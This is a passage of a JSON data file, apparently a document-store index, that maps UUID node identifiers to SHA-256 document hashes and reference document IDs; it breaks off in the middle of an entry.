"56c04a76-9c00-4359-b436-9c97b7e0ebc4": {"doc_hash": "f87a32574bd87716b4b80087ce60b4f116921f9ca4fc02da9aee91e6dd48d376", "ref_doc_id": "0e872210-53ae-4825-94de-0be0e4844acd"}, "4ddd7ab1-b511-4d1e-b101-c62d1d172c21": {"doc_hash": "450c538639c698e88cf2f94533e7a9016b534e05b52a667892d2c26172b39d3f", "ref_doc_id": "d1eb596a-6e77-4161-8724-3485d090da77"}, "baf3f938-5140-4ee5-bf1e-dd8dbd115be9": {"doc_hash": "80bb13499d1ab0cfaa445213a26a245c834879eb4a4bb18aaad84818ebc0ece2", "ref_doc_id": "865f8cb9-30d4-4db9-ac4f-bbe597873f44"}, "1aea1570-9fca-4ba9-95b2-cec968c881b8": {"doc_hash": "8b15f3d59c8fd4407d4dd3505746bab113ffdb1b71eb76bb340770beb9530fa8", "ref_doc_id": "d8d53b8e-6ac7-446e-8c21-72882030baa4"}, "b479c015-a3c0-45d8-9fba-5df260156e95": {"doc_hash": "b6a6378038109eea1ef217319dd21b92d6fc0c5f2955fd3a9f7aae07abe90b77", "ref_doc_id": "d3365039-0c8c-4abc-936c-41861e37317f"}, "ce5048a3-dcf0-40e7-8228-0bd3c9ee313b": {"doc_hash": "03149af1dfca853889b59acee35c0b3dc92e5a53e055ab6c0cc9797c88849264", "ref_doc_id": "1b0df341-2e51-409d-9add-d67fad62a602"}, "ff23a2c6-9445-4bda-a37c-872ad5481724": {"doc_hash": "af84c8cd0420924b84287fff7f486fd505d19dba0f0622d3b08e0e566c4518dc", "ref_doc_id": "59472fd4-b251-4e36-ae6e-b7185ff88454"}, "7cc18795-0679-4c9a-9c56-dbc23d607be3": {"doc_hash": "d69063351311899cca5ca57a84a57ea925b82ac38e1bc2e10d8fa52efc92994d", "ref_doc_id": "03d6c74a-702f-4265-91f0-8945e6619169"}, "0b547b31-8340-47bf-a86c-c8f3b8bdda6b": {"doc_hash": "aece502cbd291de4e2a20b5d896e6e4ac4e92485addd8a8768de07c9c8d4ad01", "ref_doc_id": "03d6c74a-702f-4265-91f0-8945e6619169"}, "26a4cf8b-a0b4-483a-8ec1-22cceff71638": {"doc_hash": "df10d9412c8d290ac7b17c5b41fefeb1ca8e66f6e2e9171c61db30954822e43d", "ref_doc_id": "2b662e88-abfa-47a4-9143-6343ab6caba7"}, "4f1bc339-60e3-43b2-b670-896f4300d120": {"doc_hash": "c8c6f62e5e6895f4719b60310a777a29656faa503349b5d05a90699d250f1ff2", "ref_doc_id": "19c6cc07-bc14-4fb6-9803-1d2a633e738a"}, "02510199-2642-4cef-b0c5-1f938775df5e": {"doc_hash": "14d783c07034e72139dcfe451247279ec35fb10a884bccba060c5ab1fb317e4d", "ref_doc_id": "ddd8b97a-930f-459e-9a76-8e25e285a50f"}, "12a72c23-2125-4568-86b7-abf3dfa6ff47": {"doc_hash": "097cfd8e8828d6a73d9e1468dc4c99086a9eef4f82a1a6e7a088150488270a61", "ref_doc_id": "d04f04b0-e1e3-4498-97e5-37ac1e283988"}, "a1406aea-4a81-433e-b099-f909d9ad5c26": {"doc_hash": "d3940b2613095b9f7db26d7a343a5de0c20d874d3183840c186635acbb56258e", "ref_doc_id": "71bb8e6b-075e-497e-a7ea-fc859f5b9db6"}, "8d805081-2b96-4e5e-b6cc-a47892605e09": {"doc_hash": "7b3e372d7d0b0a34644f2de06f0ca71c8a386acc636f36e0654b60b09525eb56", "ref_doc_id": "5e2c8a10-e17a-4a8e-975d-bb1df73729c8"}, "939b7e32-f1e2-4a21-b4a8-00efc90cc73d": {"doc_hash": "7c54df7af1cd0cab93f2eda985e5e6731109d32837e4a30736f54c49029fab10", "ref_doc_id": "5f54a15d-120d-400f-9bac-b450145ed972"}, "356e0730-240d-4860-b05b-58cff56edde6": {"doc_hash": "8a082c22af5179021d9483a0cf0bb6dfdf6e7904d3b567db36a1c81a32a3bffa", "ref_doc_id": "2d396aa5-d28c-4dbf-98f5-8f56cfeeaf7a"}, "3d66df1a-3eac-4029-910a-2d5822573976": {"doc_hash": "c4c01535feb72ca512487a606f89eaa5420ba3e7f48c96f7ba65c02270d11a4d", "ref_doc_id": "959d1046-d11d-437c-9841-c671ee0b9659"}, "f4fa43b1-128e-4d9c-a420-fa30cf827c2c": {"doc_hash": "73405ac09546a7bbdf80271b9b3600e91976845de37fcf8661c18fca82c4ce86", "ref_doc_id": "24553444-4cde-44cf-beb3-a76982a7ed90"}, "1cfd17a9-f3f4-43f0-aa06-a2a745b15692": {"doc_hash": "d8f62937861c53c5aa7f7035defdf9f34f903c345fa84a73aca049876510950b", "ref_doc_id": "abd189f8-f5de-463e-9f7d-e4f63822aadc"}, "90e80038-3d01-4118-afdc-70235972c8b2": {"doc_hash": "5607ebd3dd90d9bf3052c4639dd54c8673d23a874785619896661756f6dfb809", "ref_doc_id": "84c2e511-48ec-47ff-a7e5-23983f681b44"}, "31debb55-00cc-4e2c-ac76-07dbe168fcee": {"doc_hash": "ba6e0df0db2eaff1fb3d8e5ff3f662eb24455b5d46cb40c9c6781407377c54b5", "ref_doc_id": "0b0db083-274a-4440-a644-5638d7ee1546"}, "17422496-80be-4c7a-9193-eedeada76529": {"doc_hash": "7c288fa3b2d65a3c9b1937cd184dca5e567f21f958516bad1f337ac40c19a6a6", "ref_doc_id": "dcf784b6-b3b1-438e-b1ec-fb58eb4100c9"}, "3b11a85b-a4be-4e96-8142-960782a52d9b": {"doc_hash": "e0d7c82098686c7702ed5ddd1f4230bc9c0347388f0d2ceb4f955327fb6e586b", "ref_doc_id": "c6f96e53-d21f-4f8e-980c-0291e4e94bf5"}, "c5ceb470-30a7-4daf-9c40-96eac674818b": {"doc_hash": "da98f3baf208069a29ce8d2644de10799b492a30248a9f80768941ced1ab9b73", "ref_doc_id": "e6df4fc4-db7f-4ceb-a609-7c9f924d9212"}, "57952a95-4738-4ef8-9899-eb254b72bc0e": {"doc_hash": "77775e5f5f76f42fedd7ff09eab84c7be1e5966c721f9d862d345da3063d82df", "ref_doc_id": "1759b7f5-441f-421f-a9fd-2ccffaa785f8"}, "247db873-5d5f-43a0-91ed-1c19d69fa406": {"doc_hash": "9031f95532c9775f753de04a25885fe1fda71aeaed182e574aae976cc49a2094", "ref_doc_id": "1759b7f5-441f-421f-a9fd-2ccffaa785f8"}, "7bdbf99f-5253-4c29-a20e-1bce6afc1b58": {"doc_hash": "b9dfd8a454c2aea0a6ed4179f350f001d42654720d51babb5fa40fff51b52c66", "ref_doc_id": "cd9ff649-ec18-4ac9-9da4-274624c4b102"}, "1d0a4247-f580-43da-b9cf-48fb969df598": {"doc_hash": "15690c836e3af0b14def16d113e9d38a4356c58cffeb6acb83b71dc8ccc3ba70", "ref_doc_id": "08c308e0-65ba-4778-8805-e21ca60057f2"}, "e05557b6-9643-43a0-bfd9-7ad2d423e3fe": {"doc_hash": "c633a1cf2448aaf1f06f10300959d3eb9b0b157303cdc095e8546d774ea23ce0", "ref_doc_id": "8b738493-b7b0-4073-8783-2c1ab2689ce9"}, "52036974-cad1-4c16-a9e3-b942122b4bf6": {"doc_hash": "d19b03650033ba1990493ee58aa53b5c5bb046c5c19995d527b2483cb37b66f2", "ref_doc_id": "14202eba-f4bb-434a-886d-25619c626e97"}, "8864d579-699a-43e1-9153-d4c86a9208c5": {"doc_hash": "67af22c265b8cb848a51cfbf1c7d3a21f3b9d48172481ad7e0d59fa5878cdf50", "ref_doc_id": "14202eba-f4bb-434a-886d-25619c626e97"}, "98b65ce1-d404-4410-b60d-f9700f85ac51": {"doc_hash": "0104360544b526a41d31ee3cc46b9ec81e28769781b681331ab4aafff79fa6c0", "ref_doc_id": "f14c65c4-f4e2-4744-a7a8-99617dca79c8"}, "155b9b18-88ea-4400-ae90-d380e037eda2": {"doc_hash": "881272b2766b73b9f0e070576c4228a6227fad8994225a4bdfac7568ab4b3c89", "ref_doc_id": "c1dc16ca-dd74-462c-9b49-f30857a804fa"}, "387d58a6-802f-42c3-8d0a-1678242c8b8b": {"doc_hash": "b625e79a79c3664419b2bf246dc6da1c2114482db63fcd4904391d7d6bcacf76", "ref_doc_id": "072ecfae-aeb3-4841-b622-c8c6b0bcbfc7"}, "40fb89f1-9306-4dda-b641-41d5e89e57ad": {"doc_hash": "a1e7455866159a853881a45142022dfc86ff3354d307eafe1c5e16dca0ebdd3f", "ref_doc_id": "057af806-ded4-4385-b535-eebd2b75b0dc"}, "2ee1224f-c309-40de-8464-3bb4e5749008": {"doc_hash": "0688a5ae07ed550ecdec9df932d67a108a3a2a4cfc5559cfe57ec74aca6e4fe2", "ref_doc_id": "738715f8-1aff-4a43-b245-007bb56d0338"}, "38ee6eee-c9e0-4c90-af95-0cff38953c59": {"doc_hash": "9aa1a5690d172b08fc4dd2f80e49adf777ec05ac2bdca25343fd42f85c906772", "ref_doc_id": "cfd969b8-282d-4345-bb68-4aba75a850c9"}, "f9ed3535-0133-4181-8cf8-81bd3cef9560": {"doc_hash": "9d8c868db617bf952a35c800c631ad813d8f404815292413585a6cf2b0fa1ea4", "ref_doc_id": "43860f7f-ccb0-4ab3-b118-69cbf9b32609"}, "8ddabb70-72bb-4ec5-a93d-c61b82700dce": {"doc_hash": "b4e4a0fb01e3c6e13bd4c4e394359f7b94b2c503380bd4a92e047cd2515d52f2", "ref_doc_id": "d8c9c662-c563-49af-b3c8-51c6634d6511"}, "49fdf6c2-cc37-4b53-9c6b-845c391e7d8f": {"doc_hash": "27d76206fcf32dcb9b9d1b90c0a659dc6d63d4d0403f9c91a2adf7e3a7eb3234", "ref_doc_id": "c6d23c29-e657-484b-bda8-84403ab08c41"}, "ff1784ea-6f4a-40c9-bc03-a16649772374": {"doc_hash": "36dcb7108af964c81ccd10f0d257ee0f98167f5f561d864cea81327bff761526", "ref_doc_id": "383f4465-4635-495a-a0de-0baae9da88d6"}, "2cc8fd32-b84e-45ac-aeb0-de51bd92bf8f": {"doc_hash": "4ccba1b1265c217638186a3c8bec4dcc40025b0c6dbeed9b15b3a8517c9f8711", "ref_doc_id": "59ad1153-8337-49e3-a310-6d6e330319a1"}, "0fc761f6-63f4-4d7f-859f-26f86f7af9f8": {"doc_hash": "0b886f95e9f57c0386e1ad981aefb6d5026f83a5b580e06fafd9517844bf9ec2", "ref_doc_id": "7653e2e3-0b9a-44e4-8746-2ab3e1b06dc1"}, "97c17499-ff91-4b46-a5c8-6663c5a798c2": {"doc_hash": "46cc4d742d63cc758a6a34c622358a4e6d094f25db688926e4106a1b98567c55", "ref_doc_id": "58935546-cbf0-4623-a56b-f32f4682a619"}, "2996d677-d0fc-4724-85af-f68b10360900": {"doc_hash": "6fde15611d143143ae2a778806dde093523909d0242085d50dbb6732ea79e0c1", "ref_doc_id": "bc0b990d-eb84-4a42-aea2-33bddd891e07"}, "c195a811-b220-4fd4-ab3e-f9a755a1e15b": {"doc_hash": "6f67cb2da190b6b92da0a954225d538e50883ec7973bb4e7a7ea267bb93d9d28", "ref_doc_id": "fabe0746-c7b5-4ad0-9524-01e25d290b44"}, "da2f1661-a764-4415-a56e-e5db904d4bf9": {"doc_hash": "06faab186502cef3123d11473d7603b9aadc5bc37c9acd78d8a6651c68f2ecbf", "ref_doc_id": "f3663b85-5137-4845-bbe4-90a3e9dc0763"}, "1ca6ec9c-711c-4505-aac1-7636f2ade225": {"doc_hash": "7c8c8cdba0cfe0c3b99ffffde96493cdd822d396a7cd453aaab5a8e3b75720f6", "ref_doc_id": "f3663b85-5137-4845-bbe4-90a3e9dc0763"}, "2dffab20-ff3a-46d7-94d1-57126b28fef6": {"doc_hash": "4d191ce6ed7118c71ef9fe88796cee305532c1c0235b8d38b376becda802e3fa", "ref_doc_id": "f3ca6dc3-cce7-4adb-8203-eecc5a27fed3"}, "13c72b01-50e9-433b-a555-c6e0772fc3f5": {"doc_hash": "52e48021a1be44b6cf1532d78089a5de286bf1463614af63b21c57fa37bea55a", "ref_doc_id": "f3ca6dc3-cce7-4adb-8203-eecc5a27fed3"}, "7d218378-32e1-4938-ab0f-a8a16f90573e": {"doc_hash": "08965fb32a97378df1aebd1eeb7d74cb54cb6bcb3bc2a55219ac7ec2b04ef95e", "ref_doc_id": "85fb8769-c8f9-48d3-9bc9-e329fcd1e4bd"}, "fd82a32f-a572-4634-9dce-509f67d2344e": {"doc_hash": "018b92774e6f8d2507a12c47da5c8bfd735ca0d1b2e7c62e5d917c4468667b3b", "ref_doc_id": "1710b53c-fee7-445f-a938-f42b41ae985e"}, "fb074159-8e79-414b-b3a2-c5e517d96c3a": {"doc_hash": "6bc50020dcb4c8f17c191104d210986c623e19ba0f3ef39febca8537110b79bc", "ref_doc_id": "0c76be20-2cad-4010-a0be-87089d1f295f"}, "d029ffa9-2011-4759-8cb7-9f05ee95098e": {"doc_hash": "e4fad2302ffcba113775b8912e48eef77477bfa3345371ff054b94b872834e9d", "ref_doc_id": "d1a443ae-1964-49cc-9c2e-bbdc19ae7674"}, "2ab3bb79-4ffe-4496-bc54-edcf78923d89": {"doc_hash": "4bed3991aaefd96f53c6cda9d04833b6411d39ddca0db1d38acf35bbf1961c34", "ref_doc_id": "cee41a7e-ed32-4e0a-b3ba-d51a45b42577"}, "2775cf72-6f12-4971-bd82-ff3f7742bbbe": {"doc_hash": "5c8416388a6916fe137c056671d9a0d44daea318538315daa56b00ffbad3a4de", "ref_doc_id": "11d44e7e-c872-4b75-847a-53bbb232e3c0"}, "70c1efad-c045-42ba-8b1f-550d9fdda64d": {"doc_hash": "099b0eeb3bdebf8e14dd3837e547c071e51c1ea93567ffae8d32ea6fe5a73361", "ref_doc_id": "7eb48ff8-fc96-4043-b629-e7692b0ef427"}, "ad4c72b7-2ebd-4f1c-9d70-c071f2bddd2c": {"doc_hash": "bf879912109917ba41f6b94d60b7b56d3edab7d8fd0fdcabb9910f8ed9571a96", "ref_doc_id": "d9900fad-91ef-4225-b339-eab21059d4b7"}, "3d06cea1-7e66-4ad8-b9e9-dea0d8fb1e50": {"doc_hash": "631848ff42559aead3c12597e4c87629554634ec6c9e846f6ed933e232efebfb", "ref_doc_id": "76048ca3-92f8-4467-9cc8-5df21242e3c2"}, "e5c829c8-f5ac-40c6-bbf6-6a40533489e2": {"doc_hash": "fa17b303b11a7e581c36d215f6f56d2f6b8b192100cbc4a04d5614ef608c7183", "ref_doc_id": "62a16f55-2553-437b-85aa-a341bc986a99"}, "3804a784-2d80-4590-967a-dcafd2659e54": {"doc_hash": "751f38f26eb00357e2b83a86cee71eabf95e558341606888a6d98b5d699eafd8", "ref_doc_id": "00bbf150-9305-49f1-b36e-64186748816b"}, "3520f406-ec18-4092-a38b-660300fe5204": {"doc_hash": "edae2b12d74938ddf949826ec90266c42d9011a5757bd4cad565507ae439df59", "ref_doc_id": "2c01cb90-1a15-42f6-9e9d-790a09bf2efd"}, "ec1a6771-1fa7-4618-9e90-87e07f91547d": {"doc_hash": "5230f8c7d8d31c27f3bf530a80d83cb4172dbe6078d5595e9050cdc73c9db3cc", "ref_doc_id": "8ac7b98e-5bd2-460f-8bbf-0697b076c4b6"}, "8efa278c-b98c-4e1a-8c6d-e881ccdc0898": {"doc_hash": "425fc6ff2aa49002b2b38afa3005e48b113ecee3e9ff13d9648b0551821fc39d", "ref_doc_id": "966e7775-20e7-4aa8-9396-ea55ce450fe5"}, "e2f36a02-915e-40e3-9f20-8e9bf536624c": {"doc_hash": "86636d372b621654daa6993125aae978466f75068cf3c44ce920b10c7cbb599c", "ref_doc_id": "cf35c627-405b-4dbb-b7d4-be24d068b174"}, "b7cee880-6dd0-4db0-84ab-031920f0eaa1": {"doc_hash": "1525084f0a247ef5fd8e6ab545f9e8725f88bff5d81a05083d9d8262284814f4", "ref_doc_id": "cf35c627-405b-4dbb-b7d4-be24d068b174"}, "f1ef5ea8-1e32-46b3-b17a-978edc5a34bc": {"doc_hash": "d9547708b852e02e3c0ff32400e54ec02f61f4d1042b94459a69530fd2b38ecc", "ref_doc_id": "2adfc389-1945-44d4-a04f-20678d22df81"}, "9a7b8504-d07f-404a-b406-d6f649ada750": {"doc_hash": "9fb55ad6e655fc3bdb1789287b1fb19980a33a687ac63d73412668cd39e43a6a", "ref_doc_id": "1548c67f-2509-40d8-b9ab-3d72418fb55e"}, "b89fcaa2-bada-4b59-a662-4246916208d5": {"doc_hash": "e456e62b320ba14a02355f93ce30be6f2e559e939737c56feff472b5a7072dbe", "ref_doc_id": "79c4ed0e-e7dd-4872-97ee-3ae2bf617cb4"}, "ce888102-0ec1-41fc-98c1-9e929d6d9ff7": {"doc_hash": "b9fccfd44a74f942274b5b35dfd9a04ec13b969416b19fdfaf01826d4fa337bd", "ref_doc_id": "2ac987c9-e972-40e7-aa29-ee667ce146bf"}, "ad0cd368-1d2b-4c45-9b68-8d2bba6f3e3a": {"doc_hash": "59930ad337c60a4eebe17e0c035357e428d589666bbbfe2b2da52e702dea8035", "ref_doc_id": "685a381b-0f52-48ff-8716-b33acc4cf1aa"}, "50bb1c6e-bd2e-49cd-bb81-d1135c6e6680": {"doc_hash": "a0bf4a8ee461b8f25d1cf099352350afa642c0a2b573c1dfeb5640b9d5d4856e", "ref_doc_id": "c1066eff-6d15-4f4b-a060-2454c7cd599f"}, "ab30ee0c-b392-467c-bd16-e3912f29e3e2": {"doc_hash": "9e4bd1bb8ba25225ce35789b66c8e229a263d8faedc369085768b6fea17e65b8", "ref_doc_id": "32a2abc1-b78d-4e66-a904-4842acb5707f"}, "6ea0b4dd-1099-4dba-a6e6-3ed1894f5dfe": {"doc_hash": "e177196f87ea998c727e17eb6614ac96cce65794a494c2632c5356fd801898c1", "ref_doc_id": "aa4bda74-e719-4b41-a232-c6a13b73a470"}, "36d9ac75-0d33-40e9-a14c-c9b2fc4fc7e4": {"doc_hash": "68358e4fc26f758ce530a0acea4cf474d6aa4d6483f351d7cf8a6afa8ba58970", "ref_doc_id": "1427eb19-d3c4-49ae-a02a-c3126732870f"}, "e6ba7f7f-b657-4c86-a974-501326c88177": {"doc_hash": "a31a6f93f51ba94822d0e6bcace04a2f605fdf14430faa64a00bda6cea791392", "ref_doc_id": "22e6772f-0557-485d-81fd-3eb4bec7df24"}, "46badc81-4deb-4923-a91f-02928581c3fd": {"doc_hash": "34737db2dee39836f9464839d387f942d2e665d038c254a500b85321a029d367", "ref_doc_id": "55230178-4002-4de5-8e3d-da2937f692ae"}, "abf1b763-aeff-47f9-956e-c04fc9fc3b81": {"doc_hash": "dbbbbb9c4fd28a17dc86af52a4e5666cb84ab43fce931467fad3148e0150cfb7", "ref_doc_id": "4f366716-47f7-4bce-a027-ba9826fb5e15"}, "a00e9a92-aad8-491a-a446-793fe8a63a93": {"doc_hash": "fdc0de08e3adcbb5f581cfe68ff831fc68364a65fbcba3846802ad1507d74c7f", "ref_doc_id": "788b1741-5713-4b00-b067-2c3b7fa7509b"}, "61798928-d7e4-425b-9f74-91f21ae97ab6": {"doc_hash": "db242c66661d185d341a65bf78eeb0d213fce4f66d3c23b0021ef1e3fdefdfbc", "ref_doc_id": "f19845dc-1c38-40f7-a9f5-22076d941232"}, "8292560e-95e7-457d-9f39-ba54e24af9be": {"doc_hash": "c0e3738db5351b7f42064856f18388c96770ef4a10c6f09a2a9b2f81f762ddea", "ref_doc_id": "cc7da19d-5515-493a-80d9-56d1e268bf9b"}, "d873be0e-e9bc-4dfb-bed1-6afc0d680a98": {"doc_hash": "9bf29174bd9613b875793a9a806a7e1a848dc99112a7699105a5de7bcd780283", "ref_doc_id": "77785a5c-ac2f-4bd7-b57d-280bdd1bcb85"}, "4b3428e3-0d60-4cdf-844a-a1872253dd78": {"doc_hash": "b56c64e61edd7b6a42c7951335dc1078c92fbf30f2275ae5bd68fe5880d1accc", "ref_doc_id": "b949fcd3-d214-4441-b771-7006ed718920"}, "9822fca6-ba2f-4503-b4b4-aac72947e041": {"doc_hash": "dc5c5e28f6dabaaebadb24ab4ee63fe4db795e32a121a0cfccb25cf7ea947577", "ref_doc_id": "22f957bd-a26c-48b8-84be-4b9aab652512"}, "d351b19e-7c84-418d-93b1-8c52113b00f6": {"doc_hash": "b5f7de19e5c56e68d3fd945fbf0650eb109407bbe93c141e059546d83b23ba3d", "ref_doc_id": "0d027fb3-dddd-49d2-a881-3531e12cc8fa"}, "571b87d3-1327-4fd2-900a-f57f74803b7c": {"doc_hash": "18b9562e78935459564fe4f0cabdaa60e6e6aae66c6f791e91822b4713c84124", "ref_doc_id": "0d027fb3-dddd-49d2-a881-3531e12cc8fa"}, "4b075f27-9f83-4e90-9fcf-3e3e44a78c02": {"doc_hash": "77ee29611289e0768af40c03413a47b95f34e64b198095bd60a673bc0575b4d1", "ref_doc_id": "eb5589dd-06bc-4f44-bcb0-ce6dcf7208f0"}, "cff0fd30-21c0-404d-8f6e-de7aaed22018": {"doc_hash": "0fe0a5bef8b35b6dd248648ff7674cd913c167ead64b1be7d1f49e015cc95c31", "ref_doc_id": "5c464e1e-806d-4ed5-ab14-9e16cffc013c"}, "10cce85a-ea7c-403e-9279-e8e77ba7d62c": {"doc_hash": "43de77ccdca1c77e43d432ecf212563067eef97978853032936bbb1edab241f6", "ref_doc_id": "2396d5cb-1cff-475b-875d-7303607f2216"}, "4a23a0d7-51b4-452e-9823-28846bd05566": {"doc_hash": "b54e8010d88246e50cbb5b6b3001f60434e11f1e077799a4cfa998323ed9464d", "ref_doc_id": "2396d5cb-1cff-475b-875d-7303607f2216"}, "fc9f9e2f-b318-4eac-a723-4074e5122716": {"doc_hash": "d19dde0faef2131e3de02da0987c8c0fff1b47edb9e05adedcc35ea5024912fe", "ref_doc_id": "2396d5cb-1cff-475b-875d-7303607f2216"}, "8baa4512-191f-4d12-9983-c368384a6dc4": {"doc_hash": "f03ebe30685f34daa979d760e2078d081d306e139f845f1db5c74eb571e7e348", "ref_doc_id": "2396d5cb-1cff-475b-875d-7303607f2216"}, "94cf70f2-1867-4b85-afb9-f3a027c13f68": {"doc_hash": "f8a5412253eb212a94f7f3a43a893ff3f05e885091f5a5498f216dd636609cfa", "ref_doc_id": "d0312b7a-cb5a-48ac-b6d9-5a6f41567582"}, "adf9acaa-bde0-4fbf-afcd-91ff1f741fc3": {"doc_hash": "907448a508120feca097e3ededc17602f4f419c302da18b63aae36613c4caa04", "ref_doc_id": "7b74d5e1-2d02-41bb-aff0-08fb84f18a61"}, "e6c2657e-cf38-4d41-811b-2036cd108d93": {"doc_hash": "4f163212beca378e57fda94390331fb1f0814831a4f98a96afe763e47365d940", "ref_doc_id": "0137a2cc-9011-4a3f-b5ea-eb440d83efeb"}, "aee514f5-4b76-4bd6-b654-e1aaa621d745": {"doc_hash": "3607464d495df7e01085b355ab5e9b19761453c5f852b4b391810886422c2d7c", "ref_doc_id": "0a6859b0-3a8f-41bf-936f-bf7c59d329a2"}, "36d02be3-e2f2-4e12-8474-dc236b940f6a": {"doc_hash": "f80ddd1191a0273b9fa893972bfcf4cb3265be50d7cdf8bf8e7fe901bae58c02", "ref_doc_id": "9d6943d2-b427-4b63-934c-6458263db087"}, "77208e08-4dec-4d87-8ead-d2c7ecef08b1": {"doc_hash": "eb545a6e22d3666b6e2649f83db2d883f07e01edee0aad2324f75eb6ac0b2fa6", "ref_doc_id": "8a669b95-3494-41d6-b8bb-b35d05e1bd23"}, "ae48282f-d5dd-4493-9bf6-ba62be0734f4": {"doc_hash": "3f01b5efb186c6e145e19c64fb05831bb6c74bc3857c09b74f1bccedce068f69", "ref_doc_id": "8a669b95-3494-41d6-b8bb-b35d05e1bd23"}, "b83685bf-a560-4c21-b1e4-e1353a2e47c3": {"doc_hash": "1b8e9d886e39d910fcfc70160a0601fef4b54949c93e1c8467a8be6539bd33e1", "ref_doc_id": "f4b56dbb-3650-47a2-b3d0-7557ca9c593e"}, "2c06c253-8c5c-47ab-af07-89ec5f04d5ff": {"doc_hash": "9af47d375e8ad4f2359e239fbe57ca0da8b8c79a73b5e70039d04b9a37964551", "ref_doc_id": "a2bd4517-2dec-4d35-8ca5-389597f4d3b9"}, "c90e676b-639e-4eaf-9acc-7e2f4f7d657d": {"doc_hash": "d4dcd81d878d77123a5bb56cc5466fea4438ea213a9e5a67b0cf25c6c0c3c1a3", "ref_doc_id": "dc87aed5-d67a-4fef-b73d-f2c0f533f5bc"}, "17841a25-326f-4baf-ae69-528c9bd6b8d5": {"doc_hash": "d908ea8d01e37ec372aacaf319b43f45c791e18ad316512ccda1faffcdf66a5c", "ref_doc_id": "862d9f24-b20a-42bd-862c-4620d7b657e1"}, "cceb856d-bce1-4fc5-8dee-c4e5a31700a9": {"doc_hash": "5bd99ec8b4dd3017ef21f810db15ddbf46824f197c44df974ea17535e051e4b5", "ref_doc_id": "3927bc7d-87d4-4023-a0c7-39c2f6879269"}, "9129da86-42ae-4ae0-ada0-bf39575bef63": {"doc_hash": "bb4b59dc029f56d99280c4a3b63e87aea0037082fb807219b27099417565d712", "ref_doc_id": "de4c336d-9b37-40b4-af34-1c08a233d1d1"}, "05f5807d-ff00-484b-b925-cece49344685": {"doc_hash": "85d2650006ee7ee8db6975bc654e033e19f33ba8fe3ced07b1d2cb255bfe6bda", "ref_doc_id": "21b4d607-1331-4c4a-a6c8-60eb19a0f1d9"}, "ea5517a3-2839-4053-a1b2-cce94dc175cc": {"doc_hash": "6896b4aac4fe5508fc7836b9a6fdd60df7539dba9c58b254d73c3f74be0fdea9", "ref_doc_id": "2712ca84-2eb2-4adf-8f38-f57461b60dfb"}, "a87ebdfc-3bfb-425c-a34a-d7c27039c591": {"doc_hash": "d241afa0543fc6813f9e5d81cf632b5f87bef0c88c9801178a9cafce6ef13ce6", "ref_doc_id": "f5c54eea-a0eb-44bc-8b52-48d3e9f00a1b"}, "d6cf4491-403f-4869-bce1-beb2987b098d": {"doc_hash": "bbb6ffb6e7cfe86eb0ef9034c22f776dbc4f125c5b9a3a3d3412d2adcf4cd0ec", "ref_doc_id": "f5c54eea-a0eb-44bc-8b52-48d3e9f00a1b"}, "814b0675-be6e-49b3-a9eb-3f211272f2f6": {"doc_hash": "b9c495a740da9a646a853adafdf43e0c06eecc714451e85be937ca9b150f7e73", "ref_doc_id": "35af454d-9818-4eb3-8905-54007222c87c"}, "c4e46788-f358-428b-88a6-821e43f5a3d9": {"doc_hash": "1ed6000c9f9e50f61412eb0b73ebf45e71b1059e9b95f4352c720cb1247c106b", "ref_doc_id": "35af454d-9818-4eb3-8905-54007222c87c"}, "93923ab7-93bc-4809-b0e4-034a53c34e81": {"doc_hash": "91174d80080769f8f707a20dc468c2201caf9c36bca5c3d1d925224e824e9120", "ref_doc_id": "5086b18d-1583-4ce3-a7fe-c5046582df5f"}, "3375fd3c-c6b3-49ce-9b8f-f00ff8275388": {"doc_hash": "29ea24c9f2cee50ff61e766247be2907917fe71d2a06c4675b51e2fdee41c8cd", "ref_doc_id": "b0d97fa8-9fb1-4362-9329-f8fc3633a0dd"}, "6981a4c4-e8d6-463f-a07c-821795cd5f36": {"doc_hash": "a198670158c86aeec0811e2b5eba59d1c1ca6e31b11bb13155418f4935bd3d76", "ref_doc_id": "dd3dbb0c-1adc-48d9-9831-5eb2dee8390c"}, "b6526c3a-3994-4103-8d5e-57c0cd9b231b": {"doc_hash": "9c66c1cfcec663e4dca82a41b41f2df12a3ad9ea90112f19ed3e4b06c516982c", "ref_doc_id": "fba510bf-3047-4b02-bab7-5ab7e78ec96c"}, "edbcca9a-685c-436d-8a17-75620e80ca26": {"doc_hash": "227bf64429ae009b723194bb75307f20e7efea5f9aca160fe77e73f1a20b4286", "ref_doc_id": "c4ad0626-b1fb-40f9-a83c-94a794bb23ce"}, "71161734-9db6-4398-9a4f-7177225bba60": {"doc_hash": "e118b848416028d0c1547187eb73d99f98704d72cfabc8858febbc0384a1931c", "ref_doc_id": "3ff6a2e0-063b-4e2e-94a3-d80fa47a129b"}, "7e612922-c0e6-4e4b-a37c-25c0fa1bd259": {"doc_hash": "dd6d58eed66449033dfefe410293b4d3fe224d1eb096a4e4579b7c19d17523ff", "ref_doc_id": "64f0b225-6457-4c2d-a66e-766a3cc6bbe6"}, "6f5cc130-37e1-4079-873d-25d761e2a73a": {"doc_hash": "0a2e723a375cc616d2bb0647355da9bcc234c4f3e5c3f942aaf3d19d67966c88", "ref_doc_id": "32a84492-20ca-4031-8647-8cb98bdfce01"}, "d935ed0e-808e-4dac-8c78-e596aa277c26": {"doc_hash": "1f80136e3fcd5f12ad09caf2b4a231d57e3f8909c33adce4f7c7e74dbddeda00", "ref_doc_id": "16664d19-ba96-4e43-a461-54c27917a287"}, "a83345e6-688e-4178-b6c9-dc78ce8bab9b": {"doc_hash": "13d45c92a62263537130896d1159e055b08fa2720ef81437c66b869530dd14e5", "ref_doc_id": "5554a626-9d0a-4727-bef4-2b73a53129ad"}, "f793371b-6e48-4022-8025-02ff712e2bd5": {"doc_hash": "bbe8b6eeb3ed02a821d62544935a2b77f4a649373d83b85f4909c1b35305ff62", "ref_doc_id": "15d6558f-b573-497d-bf1c-958cc813c5e9"}, "9c0c1d4d-eed5-4b8b-b11a-c225f45d907a": {"doc_hash": "40296f63a580b96ce2fc8731b2d31112c51337fb85002a11dd9193407c213555", "ref_doc_id": "eae5884d-40ad-4523-896f-01fbc5006c06"}, "102e2008-bafc-4bd1-9153-d7a3055497e5": {"doc_hash": "fabe4d841c2d5eb5f64f3b37062214992650bf92e3a4d6063e715ef5c88e41ca", "ref_doc_id": "c61c5140-4be8-4bd3-8ab4-5439ff3c468f"}, "cf53c8e3-c83f-46d2-8e3c-58db88aa0f23": {"doc_hash": "6109fd155c610b3649d728f3a09be7022a9c709913f6d54e7f0e1fa2a0656f93", "ref_doc_id": "2e442269-5031-4c17-af2e-8b6741e85195"}, "addc2515-350a-47e7-8260-43aff8e7b221": {"doc_hash": 